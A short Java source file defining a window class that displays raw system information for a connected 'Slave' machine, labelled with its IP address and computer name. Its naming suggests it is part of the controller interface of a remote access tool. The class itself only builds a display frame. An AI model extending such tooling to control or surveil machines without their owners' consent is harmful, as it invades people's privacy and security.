package com.redpois0n.ui.frames;

import java.util.HashMap;

import com.redpois0n.Slave;
import com.redpois0n.util.IconUtils;



@SuppressWarnings("serial")
public class FrameRawSystemInfo extends FrameTextPane {
	
	public static HashMap<Slave, FrameRawSystemInfo> instances = new HashMap<Slave, FrameRawSystemInfo>();
	private Slave slave;

	public FrameRawSystemInfo(Slave slave) {
		super();
		instances.put(slave, this);
		this.slave = slave;
		super.setTitle("Raw system info - " + slave.getIP() + " - " + slave.getComputerName());
		super.setIconImage(IconUtils.getIcon("computer_info").getImage());
	}

	@Override
	public void exit() {
		instances.remove(slave);
	}

}
